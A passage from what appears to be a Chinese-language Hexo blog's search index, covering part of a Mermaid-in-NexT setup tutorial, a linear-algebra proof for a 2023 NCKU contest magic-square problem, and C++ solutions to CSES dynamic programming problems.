(圓餅圖)\nXY Chart (長條圖＆折線圖)\nMindmap (心智圖)\nTimeline (時間軸)\nGantt diagrams (甘特圖)\nSequence Diagram（時序圖）\nClass diagrams（類別圖）\nBlock Diagrams (區塊圖)\nState diagrams（狀態圖）\nEntity Relationship Diagrams（實體關係圖）\nUser Journey Diagram（使用者旅程圖）\nQuadrant Chart (四象限圖)\nRequirement Diagram (需求圖)\nGitgraph diagrams\nZenUML\n\n如何使用 \n環境設置 \n首先要先配置一下環境，到./themes/NexT/_config.yml中找到mermaid的配置並改成以下程式碼\n# Mermaid tagmermaid:  enable: true  # Available themes: default | dark | forest | neutral  theme:    light: default    dark: dark\n然後這邊他有叫你設定在亮暗模式下的主題，這邊我設定的是default和dark，你也可以試試看其他的，但是，如果你跟我你樣是可以切換亮暗模式的話，會發現不會隨著背景切換而改變\n解決切換亮暗的問題\n修改themes/NexT/source/js/third-party/tags/mermaid.js中的程式碼，修改判定亮暗模式的部分\nCONFIG.darkmode &amp;&amp; window.matchMedia('(prefers-color-scheme: dark)').matches\n\\(\\rightarrow\\)\ndocument.body.classList.contains(\"darkmode--activated\")\nthemes/NexT/source/js/third-party/tags/mermaid.jsdocument.addEventListener('page:loaded', () =&gt; {  const mermaidElements = document.querySelectorAll('.mermaid');  if (mermaidElements.length) {    NexT.utils.getScript(CONFIG.mermaid.js, {      condition: window.mermaid    }).then(() =&gt; {      mermaidElements.forEach(element =&gt; {        const newElement = document.createElement('div');        newElement.innerHTML = element.innerHTML;        newElement.className = element.className;        const parent = element.parentNode;        // Fix issue #347        // Support mermaid inside backtick code block        if (parent.matches('pre')) {          parent.parentNode.replaceChild(newElement, parent);        } else {          parent.replaceChild(newElement, element);        }      });      mermaid.initialize({        theme    : document.body.classList.contains(\"darkmode--activated\") ? CONFIG.mermaid.theme.dark : CONFIG.mermaid.theme.light,        logLevel : 4,        flowchart: { curve: 'linear' },        gantt    : { axisFormat: '%m/%d/%Y' },        sequence : { actorMargin: 50 }      });      mermaid.run();    });  }});\n不過這樣子的話，要重整頁面才會切換，我還想不到怎麼辦法即時切換，如果有人知道的話拜託告訴我～\n插入文本方式 \n在文本中插入\n```mermaidtype```\n或是\n{% mermaid type %}{% endmermaid %}\ntype 的部分後面會講到，這邊要注意的是如果是放在 codeblock 中的話，會需要到_config.yml中的highlight中移除mermaid，這樣子才能正確顯示 (會建議使用這種方式，因為這樣子使用其他有支援 mermaid 的工具檢視 markdown 時 (如 vscode 或是 github)，這些圖表才會自動生成)\nHexo config filehighlight:  exclude_languages:    - mermaid\nFlowchart (流程圖) \n\ntype: flowchart\n由數個節點（幾何形狀）和邊（箭頭或現）組成\n\nflowchart LR\n  A[This is the text in the box]--&gt;B\n  B&lt;--&gt;D\n  D-.-&gt;C\n箭頭指向 \n\nTB / TD：Top to bottom\nBT：Bottom to top\nRL：Right to left\nLR：Left to right\n\n… 未完待補：可以到官網查看\nPie chart diagrams (圓餅圖) \nXY Chart (長條圖＆折線圖) \nMindmap (心智圖) \nTimeline (時間軸) \nGantt diagrams (甘特圖) \nSequence Diagram（時序圖） \nClass diagrams（類別圖） \nBlock Diagrams (區塊圖) \nState diagrams（狀態圖） \nEntity Relationship\nDiagrams（實體關係圖） \nUser Journey\nDiagram（使用者旅程圖） \nQuadrant Chart (四象限圖) \nRequirement Diagram (需求圖) \nGitgraph diagrams \nZenUML \n補充 - 畫數位時序圖（wavedrom） \n這個先不講，之後有空再補 (主要是我也不太清楚他怎麼用 xd)。然後他和 Mermaid 同時使用會造成字體大小會打架，如果想知道用法的話可以看看官方文件，或是語法教學\n結語 \n\n其他功能 \n\n側邊欄\n－ 基礎配置 (關於、標籤、分類、歸檔、搜尋、頭像、個人相關連結)\n－ 切換語言\n頁底\nutterances 留言板\nGoogle\nAnalytics 統計網站資訊\n日 / 夜模式\nlive2d 角色（就是網頁右下角那隻可愛的狗狗）\nSEO：搜尋引擎最佳化 (Search Engine\nOptimization)\n剩下的一些小工具\n自訂網域\n\n","categories":["教學文"],"tags":["Hexo","NexT","未完成"]},{"title":"2023 成大邀請賽 pA 題解","url":"/2023-NCKU-HSPC-pA/","content":"前言 \n雖然這題的答案就是cout &lt;&lt; 1;，但因為我隊友不知道怎麼證明，所以就了這篇文章。\n\n題目 \n題目網址\n總之就是有一個九宮格，只填了三個數字 a / b /\nc，試問滿足直排、橫排、兩個對角線上的所有數字的和都相同的解有幾個。\n\n\n\n\\(a\\)\n?\n?\n\n\n\n\n?\n?\n\\(b\\)\n\n\n\\(c\\)\n?\n?\n\n\n\n解題思路 \n直排、橫排、兩個對角線總共可以列出 8 個等式，而我們有七個未知數（缺的六個格字還有數字和）。\n重新定義一下\n\n\n\n\\(a\\)\n\\(x_1\\)\n\\(x_2\\)\n\n\n\n\n\\(x_3\\)\n\\(x_4\\)\n\\(b\\)\n\n\n\\(c\\)\n\\(x_5\\)\n\\(x_6\\)\n\n\n\n\\[\n\\begin{align*}\ny &amp;= a+x_1+x_2 \\\\\n  &amp;= x_3+x_4+b \\\\\n  &amp;= c+x_5+x_6 \\\\\n  &amp;= a+x_3+c \\\\\n  &amp;= x_1+x_4+x_5 \\\\\n  &amp;= x_2+b+x_6 \\\\\n  &amp;= a+x_4+x_6 \\\\\n  &amp;= x_2+x_4+c\n\\end{align*}\n\\]\n其中會發現 \\(y=x_1+x_4+x_5\\)，是當\n\\[\n\\begin{align*}\ny &amp;= a+x_1+x_2 \\\\\n  &amp;= x_3+x_4+b \\\\\n  &amp;= c+x_5+x_6 \\\\\n  &amp;= a+x_3+c \\\\\n  &amp;= x_2+b+x_6 \\\\\n\\end{align*}\n\\]\n的必然結果（由前三條等式減去後兩條等式的結果），因此可以將此式去掉，剩下七個等式，以順序 \\(x_1, x_2, \\cdots, x_6,\ny\\) 排列，轉換成增廣矩陣。\n\\[\n\\left[ \\begin{array}{ccccccc|c}\n-1 &amp; -1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; a \\\\\n0 &amp; 0 &amp; -1 &amp; -1 &amp; 0 &amp; 0 &amp; 1 &amp; b \\\\\n0 &amp; 0 &amp; 0 &amp; 0 &amp; -1 &amp; -1 &amp; 1 &amp; c \\\\\n0 &amp; 0 &amp; -1 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; a + c \\\\\n0 &amp; -1 &amp; 0 &amp; 0 &amp; 0 &amp; -1 &amp; 1 &amp; b \\\\\n0 &amp; 0 &amp; 0 &amp; -1 &amp; 0 &amp; -1 &amp; 1 &amp; a \\\\\n0 &amp; -1 &amp; 0 &amp; -1 &amp; 0 &amp; 0 &amp; 1 &amp; c \\\\\n\\end{array} \\right]\n\\]\n&lt;summary&gt;利用克拉瑪算出判別式 $\\Delta$ 的值&lt;/summary&gt;&lt;p&gt;這邊直接用計算機算，得到答案為 - 1。&lt;/p&gt;\n&lt;p&gt;&lt;span class=\"math display\"&gt;\\[\n\\Delta = \\begin {vmatrix}\n-1 &amp; -1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 \\\\\n0 &amp; 0 &amp; -1 &amp; -1 &amp; 0 &amp; 0 &amp; 1 \\\\\n0 &amp; 0 &amp; 0 &amp; 0 &amp; -1 &amp; -1 &amp; 1 \\\\\n0 &amp; 0 &amp; -1 &amp; 0 &amp; 0 &amp; 0 &amp; 1 \\\\\n0 &amp; -1 &amp; 0 &amp; 0 &amp; 0 &amp; -1 &amp; 1 \\\\\n0 &amp; 0 &amp; 0 &amp; -1 &amp; 0 &amp; -1 &amp; 1 \\\\\n0 &amp; -1 &amp; 0 &amp; -1 &amp; 0 &amp; 0 &amp; 1 \\\\\n\\end {vmatrix} = -1\n\\]&lt;/span&gt;&lt;/p&gt;\n&lt;p&gt;這邊這題就是可以解了，因為&lt;span class=\"math inline\"&gt;\\(\\Delta \\neq\n0\\)&lt;/span&gt;，所以只有唯一解，且因為&lt;span class=\"math inline\"&gt;\\(\\Delta =\n-1, \\Delta_{x_1}, \\Delta_{x_2}, \\cdots, \\Delta_{x_6}, \\Delta_{y} \\in\n\\mathbb {Z}\\)&lt;/span&gt;，故&lt;span class=\"math inline\"&gt;\\(x_1, x_2, \\cdots,\nx_6, y \\in \\mathbb {Z}\\)&lt;/span&gt;，所以答案必為 1。&lt;/p&gt;\n\n&lt;summary&gt;用高斯消去法順便得到各個位置的值&lt;/summary&gt;&lt;p&gt;稍微整理一下之後可以將增廣矩陣轉換成這樣，所以也就是只有一組解了&lt;/p&gt;\n&lt;p&gt;&lt;span class=\"math display\"&gt;\\[\n\\left [\\begin {array}{ccccccc|c}\n1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 2c-b \\\\\n0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 2a+c-2b \\\\\n0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 2a+2c-3b \\\\\n0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; a+c-b \\\\\n0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; 2a-b \\\\\n0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; a+2c-2b \\\\\n0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 3a+3c-3b \\\\\n\\end {array} \\right]\n\\]&lt;/span&gt;&lt;/p&gt;\n&lt;p&gt;寫到九宮格內如下&lt;/p&gt;\n&lt;table&gt;\n&lt;thead&gt;\n&lt;tr&gt;\n&lt;th&gt;&lt;span class=\"math inline\"&gt;\\(a\\)&lt;/span&gt;&lt;/th&gt;\n&lt;th&gt;&lt;span class=\"math inline\"&gt;\\(2c-b\\)&lt;/span&gt;&lt;/th&gt;\n&lt;th&gt;&lt;span class=\"math inline\"&gt;\\(2a+c-2b\\)&lt;/span&gt;&lt;/th&gt;\n&lt;/tr&gt;\n&lt;/thead&gt;\n&lt;tbody&gt;\n&lt;tr&gt;\n&lt;td&gt;&lt;span class=\"math inline\"&gt;\\(2a+2c-3b\\)&lt;/span&gt;&lt;/td&gt;\n&lt;td&gt;&lt;span class=\"math inline\"&gt;\\(a+c-b\\)&lt;/span&gt;&lt;/td&gt;\n&lt;td&gt;&lt;span class=\"math inline\"&gt;\\(b\\)&lt;/span&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;&lt;span class=\"math inline\"&gt;\\(c\\)&lt;/span&gt;&lt;/td&gt;\n&lt;td&gt;&lt;span class=\"math inline\"&gt;\\(2a-b\\)&lt;/span&gt;&lt;/td&gt;\n&lt;td&gt;&lt;span class=\"math inline\"&gt;\\(a+2c-2b\\)&lt;/span&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/tbody&gt;\n&lt;/table&gt;\n\n但其實也不用砸這麼大的科技，就只要先找到 \\(x_4\\) 然後用同樣邏輯找到其他的就好了\n\\(a+x_3+c=x_3+x4+b \\Rarr x_4 =\na+c-b\\)\n然後 \\(x_2,\nx_6\\) 可以藉由對角線列出二元聯立方方程式解出來，最後 \\(x_1, x_3, x_5\\) 就迎刃而解了\n程式碼 \n#include &lt;bits/stdc++.h&gt;int main(){    std::cout &lt;&lt; 1;    return 0;}\n","categories":["程式題解"],"tags":["成大邀請賽"]},{"title":"CSES Dynamic Programming","url":"/CSES_Dynamic_Programming/","content":"CSES Dynamic Programming \nCSES Dynamic Programming 的 AC 程式碼\n\nCSES Problem Set\n我的 Profile\n我的程式們\nDice Combinations \nDice Combinations#include &lt;bits/stdc++.h&gt;#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define rep(i, a, b) for(int i = a; i&lt;=b; i++)#define rev(i, a, b) for(int i = a; i&gt;=b; i--)#define tomax(a,b) (a)=max((a),(b))#define tomin(a,b) (a)=min((a),(b))#define pb push_back#define eb emplace_back#define all(a) a.begin(), a.end()#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0);using namespace std;const int mod = 1e9 + 7;signed main(){    ios;    int n, dp[1000006], pre = 1;    cin &gt;&gt; n;    fill(dp, dp+n+3, 0);    rep(i, 1, 6){        dp[i] = pre;        pre += dp[i];    }rep(i, 7, n){        rep(j, i-6, i-1)            dp[i]+=dp[j], dp[i]%=mod;    }cout &lt;&lt; dp[n] &lt;&lt; '\\n';    return 0;}// 1 1 1 1 1 1 2// 1 1 1 1 1 2 1\nMinimizing Coins \nMinimizing Coins#include &lt;bits/stdc++.h&gt;#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define rep(i, a, b) for(int i = a; i&lt;=b; i++)#define rev(i, a, b) for(int i = a; i&gt;=b; i--)#define tomax(a,b) (a)=max((a),(b))#define tomin(a,b) (a)=min((a),(b))#define pb push_back#define eb emplace_back#define all(a) a.begin(), a.end()#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0);using namespace std;const int MAX = 1e9;signed main(){    ios;    int n, x, dp[1000006], c[102];    cin &gt;&gt; n &gt;&gt; x;    fill(dp, dp+x+1, MAX);    dp[0]=0;    rep(i, 0, n-1){        cin &gt;&gt; c[i];        for (int j = 0; j+c[i] &lt;= x; j++){            dp[j+c[i]] = min(dp[j+c[i]], dp[j]+1);        }    }    if(dp[x]!=MAX) cout &lt;&lt; dp[x] &lt;&lt; '\\n';    else cout &lt;&lt; \"-1\\n\";    return 0;}\nCoin Combinations I \nCoin Combinations I#include &lt;bits/stdc++.h&gt;#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define rep(i, a, b) for(int i = a; i&lt;=b; i++)#define rev(i, a, b) for(int i = a; i&gt;=b; i--)#define tomax(a,b) (a)=max((a),(b))#define tomin(a,b) (a)=min((a),(b))#define pb push_back#define eb emplace_back#define all(a) a.begin(), a.end()#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0);using namespace std;const int mod = 1e9+7;signed main(){    ios;    int n, x, dp[1000006], c[102];    cin &gt;&gt; n &gt;&gt; x;    memset(dp, 0, sizeof(dp));    dp[0]=1;    rep(i, 0, n-1) cin &gt;&gt; c[i];    rep(i, 1, x){        rep(j, 0, n-1)            if(i-c[j]&gt;=0)                dp[i]+=dp[i-c[j]], dp[i]%=mod;                //每個最多用i次加到dp[i]的方法數    }    cout &lt;&lt; dp[x] &lt;&lt; '\\n';    return 0;}\nCoin Combinations II \nCoin Combinations II#include &lt;bits/stdc++.h&gt;#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define rep(i, a, b) for(int i = a; i&lt;=b; i++)#define rev(i, a, b) for(int i = a; i&gt;=b; i--)#define tomax(a,b) (a)=max((a),(b))#define tomin(a,b) (a)=min((a),(b))#define pb push_back#define eb emplace_back#define all(a) a.begin(), a.end()#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0);using namespace std;const int mod = 1e9+7;signed main(){    ios;    int n, x, dp[1000006], c[102];    cin &gt;&gt; n &gt;&gt; x;    memset(dp, 0, sizeof(dp));    dp[0]=1;    rep(i, 0, n-1){        cin &gt;&gt; c[i];        for (int j = 0; j+c[i] &lt;= x; j++){            dp[j+c[i]]+=dp[j], dp[j+c[i]]%=mod;            //用第0~i個數字加到任意可達的組合數        }    }    cout &lt;&lt; dp[x] &lt;&lt; '\\n';    return 0;}\nRemoving Digits \nRemoving Digits#include &lt;bits/stdc++.h&gt;#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define pob pop_back#define pb push_back#define eb emplace_back#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)using namespace std;int step[1000006];int get_step(int num) {    if (num &lt; 10) return 1;    if (step[num] != INT_MAX) return step[num];    for (int dig = num % 10, pos = 1; pos &lt;= num;         pos *= 10, dig = (num % (pos * 10)) / pos) {        if (num - dig != num) tomin(step[num], get_step(num - dig) + 1);    }    return step[num];}signed main() {    ios;    int n;    cin &gt;&gt; n;    fill(step, step + n + 1, INT_MAX);    cout &lt;&lt; get_step(n) &lt;&lt; '\\n';    return 0;}\nGrid Paths \nGrid Paths#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int mod = 1e9 + 7;int dp[1003][1003], n;bool vis[1003][1003];int dfs(int i, int j) {    // cout &lt;&lt; i sp j sp vis[i][j] &lt;&lt; '\\n';    if (vis[i][j]) return dp[i][j];    if (i == n &amp;&amp; j == n) return dp[i][j] = 1;    vis[i][j] = 1;    dp[i][j] = (dfs(i + 1, j)%mod + dfs(i, j + 1)%mod)%mod;    return dp[i][j];}signed main() {    ios;    char tmp;    cin &gt;&gt; n;    memset(vis, 1, sizeof(vis));    rep(i, 1, n) rep(j, 1, n) cin &gt;&gt; tmp, vis[i][j] = (tmp != '.');    cout &lt;&lt; dfs(1, 1)%mod &lt;&lt; '\\n';    return 0;}\nBook Shop \nBook Shop#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, x;    cin &gt;&gt; n &gt;&gt; x;    vii book(n);    vi dp(x + 1, 0);    for (pii &amp;i : book) cin &gt;&gt; i.F;    for (pii &amp;i : book) cin &gt;&gt; i.S;    for (pii i : book) {        rev(j, x, i.F) { tomax(dp[j], dp[j - i.F] + i.S); }    }    cout &lt;&lt; dp[x] &lt;&lt; '\\n';    return 0;}\nArray Description \nArray Description#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int mod = 1e9 + 7;int n, m;int dp[100005][105], arr[100005];signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, n) cin &gt;&gt; arr[i];    if (!arr[1]) rep(i, 1, m) dp[1][i] = 1;    else dp[1][arr[1]] = 1;    rep(i, 2, n) {        if (!arr[i]) {            rep(j, 1, m) {                dp[i][j] = (dp[i][j] + dp[i - 1][j - 1]) % mod;                dp[i][j] = (dp[i][j] + dp[i - 1][j]) % mod;                dp[i][j] = (dp[i][j] + dp[i - 1][j + 1]) % mod;            }        } else {            dp[i][arr[i]] = (dp[i][arr[i]] + dp[i - 1][arr[i] - 1]) % mod;            dp[i][arr[i]] = (dp[i][arr[i]] + dp[i - 1][arr[i]]) % mod;            dp[i][arr[i]] = (dp[i][arr[i]] + dp[i - 1][arr[i] + 1]) % mod;        }    }    int ans = 0;    rep(j, 1, m) ans = (ans + dp[n][j]) % mod;    cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nCounting Towers \nCounting Towers#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int mod = 1e9 + 7;int dp[1000006][4]; // -- , oo, ox, xo (ox = xo)int n, t;void build() {    dp[1][0] = dp[1][1] = dp[1][2] = 1;    // dp[i][0] = dp[i-1][0]+dp[i-1][1]    // dp[i][1] = dp[i-1][0]+dp[i-1][1]*3    rep(i, 2, 1e6){        dp[i][0] = (dp[i-1][0]*2 + dp[i-1][1])%mod;        dp[i][1] = (dp[i-1][0]+dp[i-1][1]*4)%mod;    }}signed main() {    ios;    build();    cin &gt;&gt; t;    while (t--) {        cin &gt;&gt; n;        cout &lt;&lt; (dp[n][0] + dp[n][1])%mod &lt;&lt; '\\n';    }    return 0;}\nEdit Distance \nEdit Distance#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, dp[5003][5003];string s1, s2;signed main() {    ios;    cin &gt;&gt; s1 &gt;&gt; s2;    n = s1.size();    m = s2.size();    dp[0][0] = (s1[0] != s2[0]);    rep(i, 1, n-1){        if(dp[i-1][0] == i &amp;&amp; s1[i] == s2[0]) dp[i][0] = i;        else dp[i][0] = dp[i-1][0]+1;     }    rep(i, 1, m-1){        if(dp[0][i-1] == i &amp;&amp; s1[0] == s2[i]) dp[0][i] = i;        else dp[0][i] = dp[0][i-1]+1;     }    rep(i, 1, n-1){        rep(j, 1, m-1){            dp[i][j] = min(dp[i-1][j-1] + (s1[i] != s2[j]), min(dp[i-1][j]+1, dp[i][j-1]+1));        }    }    cout &lt;&lt; dp[n-1][m-1];    return 0;}\nRectangle Cutting \nRectangle Cutting#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, m, dp[502][502];    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, n) {        rep(j, 1, m) {            if (i == j)                dp[i][j] = 0;            else {                dp[i][j] = 1e9;                rep(k, 1, i) tomin(dp[i][j], dp[k][j] + dp[i - k][j] + 1);                rep(k, 1, j) tomin(dp[i][j], dp[i][k] + dp[i][j - k] + 1);            }        }    }    cout &lt;&lt; dp[n][m] &lt;&lt; '\\n';    return 0;}\nMoney Sums \nMoney Sums#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n;int arr[1003];bool dp[102][100005];signed main() {    ios;    cin &gt;&gt; n;    rep(i, 1, n) cin &gt;&gt; arr[i];    rep(i, 1, n){        rep(j, 1, 100000){            if(dp[i-1][j]) dp[i][j] = dp[i][j+arr[i]] = 1;        }        dp[i][arr[i]] = 1;    }    vi ans;    rep(i, 1, 100000) if(dp[n][i]) ans.eb(i);    cout &lt;&lt; ans.size() &lt;&lt; '\\n';    for(int i : ans) cout &lt;&lt; i &lt;&lt; ' ';    return 0;}\nRemoval Game \nRemoval Game#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n;int dp[5003][5003];int arr[5003], pre[5003];signed main() {    ios;    cin &gt;&gt; n;    int ans = -1e18;    rep(i, 1, n) cin &gt;&gt; arr[i], pre[i] = pre[i - 1] + arr[i];    rep(i, 1, n) {        rep(j, 1, n - i + 1) {            if (i == 1)                dp[j][j] = arr[j];            else {                dp[j][j + i - 1] =                    max(arr[j] + pre[j + i - 1] - pre[j] - dp[j + 1][j + i - 1],                        pre[i + j - 2] - pre[j - 1] - dp[j][i + j - 2] +                            arr[i + j - 1]);            }        }    }    cout &lt;&lt; dp[1][n] &lt;&lt; '\\n';    return 0;}\nTwo Sets II \nTwo Sets II#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int dp[64000];int mod = 1e9+7;signed main() {    ios;    int n, goal;    cin &gt;&gt; n;    goal = n * (n + 1) / 2;    if(goal &amp; 1) {cout &lt;&lt; 0 &lt;&lt; '\\n'; return 0;}    else goal &gt;&gt;= 1;    dp[0] = 1;    rep(i, 1, n) {        rev(j, goal, i)            dp[j] = (dp[j] + dp[j-i]) % (mod*2);    }    cout &lt;&lt; (dp[goal] &gt;&gt; 1) &lt;&lt; '\\n';    return 0;}\nIncreasing Subsequence \nIncreasing Subsequence#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, 